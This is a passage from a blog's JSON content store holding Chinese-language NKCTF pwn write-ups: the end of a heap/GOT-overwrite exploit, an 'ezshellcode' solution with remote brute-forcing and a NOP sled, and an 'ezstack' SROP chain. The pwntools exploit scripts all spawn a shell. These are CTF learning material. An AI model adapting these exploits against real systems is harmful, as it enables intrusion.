class=\"number\">0x248</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak elfbase</span></span><br><span class=\"line\">paylooad=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">edit(<span class=\"number\">16</span>,<span class=\"number\">0x10</span>,paylooad)</span><br><span class=\"line\">show(<span class=\"number\">16</span>)</span><br><span class=\"line\">ru(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">elfbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x4120</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;elfbase&quot;</span>,<span class=\"built_in\">hex</span>(elfbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># recover the meta</span></span><br><span class=\"line\">payload=p64(heapaddr)+p64(heapbase+<span class=\"number\">0xe0</span>)</span><br><span class=\"line\">edit(<span class=\"number\">16</span>,<span class=\"number\">0x10</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_addr=elfbase+<span class=\"number\">0x40A0</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;ptr_addr&quot;</span>,<span class=\"built_in\">hex</span>(ptr_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># note_addr=ptr+0x2f10</span></span><br><span class=\"line\">note_addr=ptr_addr+<span class=\"number\">0x2f10</span></span><br><span class=\"line\">leak(<span class=\"string\">&quot;note_addr&quot;</span>,<span class=\"built_in\">hex</span>(note_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=elfbase+elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;atoi_got&quot;</span>,<span class=\"built_in\">hex</span>(atoi_got))</span><br><span class=\"line\">payload=p64(atoi_got)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x30</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># offset=0x2f10/0x8=0x5e2</span></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">show(<span class=\"number\">0x5e2</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_addr&quot;</span>,<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">libcbase=libc_addr-libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">0x5e2</span>,<span class=\"number\">0x8</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"ezshellcode","date":"2023-03-26T14:03:11.000Z","_content":"\nnkctf，一道简单的shellcode题，做的时候是爆破shellcode起始位置的，后面仔细想想可以填充`nop(''\\x90’)`。\n\n<!-- more -->\n\n爆破shellcode的起始位置：\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nshellcode=asm(shellcraft.sh())\npayload=b'a'*0x8+shellcode*0x3\n\nwhile(True):\n    p=remote('node.yuzhian.com.cn',36519)\n    try:      \n        p.sendline(payload)\n        p.interactive()\n        p.sendline('\\n')\n        break\n    except EOFError as e:\n        p.close()\n        raise e\n        continue\n\n```\n\nnop雪橇：\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\np=process('./'+filename)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nshellcode=asm(shellcraft.sh())\npayload=shellcode.rjust(0x100,b'\\x90')\n\n# debug()\ns(payload)\n\nitr()\n```\n\n","source":"_posts/nkctf_ezshellcode.md","raw":"---\ntitle: ezshellcode\ndate: 2023-03-26 22:03:11\ncategories: \n- pwn_wp\ntags: \n- pwn\n- shellcode\n---\n\nnkctf，一道简单的shellcode题，做的时候是爆破shellcode起始位置的，后面仔细想想可以填充`nop(''\\x90’)`。\n\n<!-- more -->\n\n爆破shellcode的起始位置：\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nshellcode=asm(shellcraft.sh())\npayload=b'a'*0x8+shellcode*0x3\n\nwhile(True):\n    p=remote('node.yuzhian.com.cn',36519)\n    try:      \n        p.sendline(payload)\n        p.interactive()\n        p.sendline('\\n')\n        break\n    except EOFError as e:\n        p.close()\n        raise e\n        continue\n\n```\n\nnop雪橇：\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\np=process('./'+filename)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\nshellcode=asm(shellcraft.sh())\npayload=shellcode.rjust(0x100,b'\\x90')\n\n# debug()\ns(payload)\n\nitr()\n```\n\n","slug":"nkctf_ezshellcode","published":1,"updated":"2023-03-30T07:52:00.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaga004x5oudcu6718ps","content":"<p>nkctf，一道简单的shellcode题，做的时候是爆破shellcode起始位置的，后面仔细想想可以填充<code>nop(&#39;&#39;\\x90’)</code>。</p>\n<span id=\"more\"></span>\n\n<p>爆破shellcode的起始位置：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+shellcode*<span class=\"number\">0x3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"literal\">True</span>):</span><br><span class=\"line\">    p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">36519</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:      </span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.interactive()</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> e</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>nop雪橇：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=shellcode.rjust(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x90&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf，一道简单的shellcode题，做的时候是爆破shellcode起始位置的，后面仔细想想可以填充<code>nop(&#39;&#39;\\x90’)</code>。</p>","more":"<p>爆破shellcode的起始位置：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+shellcode*<span class=\"number\">0x3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"literal\">True</span>):</span><br><span class=\"line\">    p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">36519</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:      </span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.interactive()</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> e</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>nop雪橇：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=shellcode.rjust(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x90&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"nkctf_ezstack","date":"2023-03-26T14:05:12.000Z","_content":"\nnkctf的ezstack，走SROP。\n\n<!-- more -->\n\n没开RELRP、Canary和PIE\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/ezstack/ez_stack'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n找`gadget`找到了这些，`0xf`对应的系统调用是`sigreturn`，看来应该是走SROP了\n\n```asm\n0x0000000000401147 : mov eax, 0xf ; ret\n0x0000000000401146 : mov rax, 0xf ; ret\n```\n\n要通过SROP执行`execve(\"/bin/sh\\x00\",0,0)`，需要找到`\"/bin/sh\\x00\"`的地址，但程序中没有，需要我们自行写入。\n\n但程序唯一一次写入的是栈上，有`ASLR`没办法定位，这里利用寄存器留下的值并通过**ROP**设置部分参数再次执行`sys_read`，将`\"/bin/sh\\x00\"`写入`bss`段。（当然**也可以利用SROP直接执行`SYS_READ`写入**）\n\n之后通过SROP执行`execve(\"/bin/sh\\x00\",0,0)`即可`get shell`。\n\n找到的wp大多是py2的，之前也没试过用py3写SROP，这里的应该用`bytes(frame)`转化`frame`的类型\n\n**exp：** \n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='ez_stack'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=remote('node.yuzhian.com.cn',34603)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \nmov_rax_0xf=0x0000000000401146\nsyscall=0x000000000040114e\nmov_rax_0_pop_rbp=0x00000000004011f0\npop_rdi=0x0000000000401283\npop_rsi_r15=0x0000000000401281\nbss_addr=elf.bss()\nframe = SigreturnFrame()\nframe.rax = 59\nframe.rdi = bss_addr\nframe.rip=syscall\nr()\npayload=b'a'*0x18+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(mov_rax_0_pop_rbp)+p64(bss_addr)+p64(syscall)\npayload+=p64(mov_rax_0xf)+p64(syscall)\npayload+=bytes(frame)\n# debug()\ns(payload)\ns(\"/bin/sh\\x00\")\n\nitr()\n\n```\n\n","source":"_posts/nkctf_ezstack.md","raw":"---\ntitle: nkctf_ezstack\ndate: 2023-03-26 22:05:12\ncategories: \n- pwn_wp\ntags: \n- pwn\n- ROP\n- SROP\n---\n\nnkctf的ezstack，走SROP。\n\n<!-- more -->\n\n没开RELRP、Canary和PIE\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/ezstack/ez_stack'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n找`gadget`找到了这些，`0xf`对应的系统调用是`sigreturn`，看来应该是走SROP了\n\n```asm\n0x0000000000401147 : mov eax, 0xf ; ret\n0x0000000000401146 : mov rax, 0xf ; ret\n```\n\n要通过SROP执行`execve(\"/bin/sh\\x00\",0,0)`，需要找到`\"/bin/sh\\x00\"`的地址，但程序中没有，需要我们自行写入。\n\n但程序唯一一次写入的是栈上，有`ASLR`没办法定位，这里利用寄存器留下的值并通过**ROP**设置部分参数再次执行`sys_read`，将`\"/bin/sh\\x00\"`写入`bss`段。（当然**也可以利用SROP直接执行`SYS_READ`写入**）\n\n之后通过SROP执行`execve(\"/bin/sh\\x00\",0,0)`即可`get shell`。\n\n找到的wp大多是py2的，之前也没试过用py3写SROP，这里的应该用`bytes(frame)`转化`frame`的类型\n\n**exp：** \n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='ez_stack'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=remote('node.yuzhian.com.cn',34603)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \nmov_rax_0xf=0x0000000000401146\nsyscall=0x000000000040114e\nmov_rax_0_pop_rbp=0x00000000004011f0\npop_rdi=0x0000000000401283\npop_rsi_r15=0x0000000000401281\nbss_addr=elf.bss()\nframe = SigreturnFrame()\nframe.rax = 59\nframe.rdi = bss_addr\nframe.rip=syscall\nr()\npayload=b'a'*0x18+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(mov_rax_0_pop_rbp)+p64(bss_addr)+p64(syscall)\npayload+=p64(mov_rax_0xf)+p64(syscall)\npayload+=bytes(frame)\n# debug()\ns(payload)\ns(\"/bin/sh\\x00\")\n\nitr()\n\n```\n\n","slug":"nkctf_ezstack","published":1,"updated":"2023-03-30T08:07:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagb00515oudh9bhbhq3","content":"<p>nkctf的ezstack，走SROP。</p>\n<span id=\"more\"></span>\n\n<p>没开RELRP、Canary和PIE</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/ezstack/ez_stack&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>找<code>gadget</code>找到了这些，<code>0xf</code>对应的系统调用是<code>sigreturn</code>，看来应该是走SROP了</p>\n<figure class=\"highlight 